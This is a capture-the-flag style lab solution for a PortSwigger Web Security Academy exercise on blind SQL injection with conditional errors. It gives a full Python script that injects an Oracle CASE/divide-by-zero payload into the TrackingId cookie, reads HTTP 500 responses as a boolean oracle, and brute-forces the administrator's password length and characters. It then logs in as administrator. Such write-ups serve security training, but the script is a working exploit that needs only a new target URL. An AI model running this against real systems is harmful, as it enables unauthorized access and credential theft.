# Blind SQL injection with conditional errors

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
> To solve the lab, log in as the `administrator` user.

```python
import requests
import sys
import string
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Blind SQL injection with conditional errors
# TARGET_URL should be the home page (e.g., https://...net/)
TARGET_URL = "https://0ad6003c0301c46780b11c71009800ec.web-security-academy.net/"

def get_session(url):
    """
    Establishes a session and ensures we have a valid TrackingId cookie.
    We need a valid cookie to append our injection to.
    """
    session = requests.Session()
    response = session.get(url)
    if "TrackingId" in session.cookies:
        print("[+] Tracking ID Found")
        return session
    else:
        print("[-] Failed to get TrackingId. Check URL.")
        sys.exit(1)

def check_boolean(url, session, sql_condition):
    """
    The Oracle: Determines TRUE/FALSE based on Server Errors.
    
    Logic:
    - We inject a CASE statement into the TrackingId.
    - If 'sql_condition' is TRUE -> execute TO_CHAR(1/0) -> Divide by Zero -> HTTP 500.
    - If 'sql_condition' is FALSE -> execute '' -> Valid String -> HTTP 200.
    """
    TrackingID = session.cookies['TrackingId']
    
    # Oracle Payload Construction:
    # 1. ' closes the valid TrackingId string.
    # 2. || is Oracle's string concatenation operator.
    # 3. FROM dual is required in Oracle for SELECT statements not querying a real table.
    NewCookie = TrackingID + f"' || (SELECT CASE WHEN ({sql_condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '"
    
    # We override the cookie for this specific request
    response = session.get(url, cookies={"TrackingId": NewCookie})
    
    # Inverted Logic:
    # HTTP 500 (Internal Server Error) means our Forced Error triggered -> Condition is TRUE.
    # HTTP 200 (OK) means the Else path was taken -> Condition is FALSE.
    if response.status_code == 500:
        return True
    elif response.status_code == 200:
        return False
    return False

def get_password_length(url, session):
    print("[*] Determining password length...")
    for i in range(1, 50):
        # We use a subquery because we are inside the 'FROM dual' wrapper of check_boolean
        payload = f"(SELECT LENGTH(password) FROM users WHERE username='administrator') > {i}"
        
        sys.stdout.write(f"\r[>] Checking Length: {i}")
        sys.stdout.flush()
        
        # If > i is False (200 OK), then the length is exactly i.
        if not check_boolean(url, session, payload):
            print(f"\n[+] Password Length Found: {i}")
            return i
    return None

def get_password(url, session, length):
    print(f"[*] Brute-forcing {length} character password...")
    password = ""
    charset = string.ascii_lowercase + string.digits
    
    for i in range(1, length + 1):
        for char in charset:
            # UX: Print progress in-place
            sys.stdout.write(f"\r[>] Extracted: {password}{char}")
            sys.stdout.flush()
            
            # Oracle Syntax: SUBSTR(column, index, length)
            payload = f"(SELECT SUBSTR(password, {i}, 1) FROM users WHERE username='administrator') = '{char}'"
            
            # If check_boolean returns True (HTTP 500), we found the character
            if check_boolean(url, session, payload):
                password += char
                break 
                
    print(f"\n[+] Final Password Found: {password}")
    return password

def login(url, password):
    """
    Standard login function to verify the extracted credentials.
    """
    login_url = url + "login"
    print(f"[-] Logging in to {login_url}...")
    
    s = requests.Session()
    
    # 1. GET request to fetch the CSRF token
    response = s.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find("input", {"name": "csrf"})
    
    if not csrf_input:
        print("[-] Error: CSRF token not found.")
        return

    token = csrf_input['value']
    
    login_data = {
        "username": "administrator",
        "password": password,
        "csrf": token
    }
    
    # 2. POST request to submit credentials
    response = s.post(login_url, data=login_data)
    
    if "Log out" in response.text:
        print("[SUCCESS] LOGGED IN AS ADMINISTRATOR!")
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    session = get_session(TARGET_URL)
    
    # 1. Get Length
    pw_length = get_password_length(TARGET_URL, session)
    
    # 2. Extract Password (if length found)
    if pw_length:
        final_password = get_password(TARGET_URL, session, pw_length)
        
        # 3. Verify Login
        login(TARGET_URL, final_password)
```